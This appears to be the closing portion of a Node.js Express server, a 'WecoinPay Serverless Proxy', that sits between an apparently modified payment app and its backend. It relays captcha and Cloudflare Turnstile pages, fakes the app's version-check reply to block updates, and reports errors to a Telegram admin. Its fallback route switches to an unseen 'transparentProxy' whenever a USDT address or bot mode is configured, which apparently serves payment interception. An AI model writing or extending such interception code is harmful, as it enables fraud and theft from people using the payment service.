        const errMsg = `🧩❌ Captcha Verify ERROR (fell to transparentProxy)\n\nError: ${e && e.message ? e.message : String(e)}\n\nStack:\n${(e && e.stack ? e.stack : '(no stack)').substring(0, 1500)}`;
        bot.sendMessage(data.adminChatId, errMsg.substring(0, 4000)).catch(() => { });
      }
    } catch (_) { }
    await transparentProxy(req, res);
  }
}
app.post('/app/captcha/verify', handleCaptchaVerify);
app.post('/app/slider/verify', handleCaptchaVerify);
app.post('/slider/verify', handleCaptchaVerify);
app.post('/captcha/verify', handleCaptchaVerify);

app.all('/app/app/version/info/getLatestAppVersion', async (req, res) => {
  res.json({ "code": 1000, "data": { "id": 1, "createTime": "2025-01-01 00:00:00", "updateTime": "2025-01-01 00:00:00", "platform": "android", "appVersion": "1.0.0", "buildCode": 1, "updateType": "apk", "downloadUrl": "", "isForce": 0, "grayPercent": 0, "updateTitle": "", "updateContent": "", "fileSize": null, "fileMd5": "", "status": 0 }, "message": "success" });
});

// Health & System Status Endpoint
app.get('/health', async (req, res) => {
  const data = cachedData || await loadData().catch(() => ({}));
  res.json({
    status: 'ok',
    app: 'WecoinPay Serverless Proxy',
    proxy: data.botEnabled !== false ? 'active' : 'disabled',
    redis: !!redis,
    timestamp: new Date().toISOString()
  });
});

// === TURNSTILE PAGE PROXY ===
// Proxies the Cloudflare Turnstile verification page from captcha.ddriva.com.
// The proxy app tries to load Turnstile from mobile.diwapay.com (404).
// If the APK's Turnstile URL is changed to xchas.vercel.app, this route serves it.
app.get('/turnstile.html', async (req, res) => {
  try {
    const qs = req.originalUrl.split('?')[1] || '';
    const targetUrl = `https://captcha.ddriva.com/turnstile.html${qs ? '?' + qs : ''}`;
    const ac = new AbortController();
    const tm = setTimeout(() => ac.abort(), 10000);
    const resp = await fetch(targetUrl, {
      method: 'GET',
      headers: {
        'user-agent': req.headers['user-agent'] || '',
        'accept': req.headers['accept'] || 'text/html,*/*',
        'accept-language': req.headers['accept-language'] || 'en-IN',
        'accept-encoding': 'identity'
      },
      signal: ac.signal
    });
    clearTimeout(tm);
    const body = await resp.text();
    const respHeaders = {};
    resp.headers.forEach((val, key) => {
      const kl = key.toLowerCase();
      if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
        respHeaders[key] = val;
      }
    });
    respHeaders['content-type'] = 'text/html; charset=utf-8';
    respHeaders['access-control-allow-origin'] = '*';
    respHeaders['content-length'] = String(Buffer.byteLength(body, 'utf8'));
    res.writeHead(resp.status, respHeaders);
    res.end(body);
  } catch (e) {
    if (!res.headersSent) res.status(502).json({ error: 'turnstile proxy error', msg: e.message });
  }
});

// Proxy Cloudflare CDN-CGI endpoints (RUM, challenges, etc.) used by Turnstile
app.all('/cdn-cgi/*', async (req, res) => {
  try {
    const targetUrl = `https://captcha.ddriva.com${req.originalUrl}`;
    const fwd = {};
    for (const [k, v] of Object.entries(req.headers)) {
      const kl = k.toLowerCase();
      if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
        kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
      fwd[k] = v;
    }
    fwd['host'] = 'captcha.ddriva.com';
    fwd['accept-encoding'] = 'identity';
    const opts = { method: req.method, headers: fwd };
    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
      opts.body = req.rawBody;
      fwd['content-length'] = String(req.rawBody.length);
    }
    const ac = new AbortController();
    const tm = setTimeout(() => ac.abort(), 10000);
    opts.signal = ac.signal;
    const resp = await fetch(targetUrl, opts);
    clearTimeout(tm);
    const respBuffer = Buffer.from(await resp.arrayBuffer());
    const respHeaders = {};
    resp.headers.forEach((val, key) => {
      const kl = key.toLowerCase();
      if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding') {
        respHeaders[key] = val;
      }
    });
    respHeaders['access-control-allow-origin'] = '*';
    respHeaders['access-control-allow-methods'] = 'GET,POST,OPTIONS';
    respHeaders['access-control-allow-headers'] = '*';
    respHeaders['access-control-allow-credentials'] = 'true';
    respHeaders['content-length'] = String(respBuffer.length);
    res.writeHead(resp.status, respHeaders);
    res.end(respBuffer);
  } catch (e) {
    if (!res.headersSent) res.status(502).json({ error: 'cdn-cgi proxy error' });
  }
});

app.all('*', async (req, res) => {
  const data = cachedData || await loadData();
  if (!data.usdtAddress && !data.botEnabled) {
    try {
      const { response, respBuffer, respHeaders } = await proxyFetch(req);
      respHeaders['content-length'] = String(respBuffer.length);
      res.writeHead(response.status, respHeaders);
      res.end(respBuffer);
    } catch (e) {
      if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
    }
    return;
  }
  await transparentProxy(req, res);
});

module.exports = app;
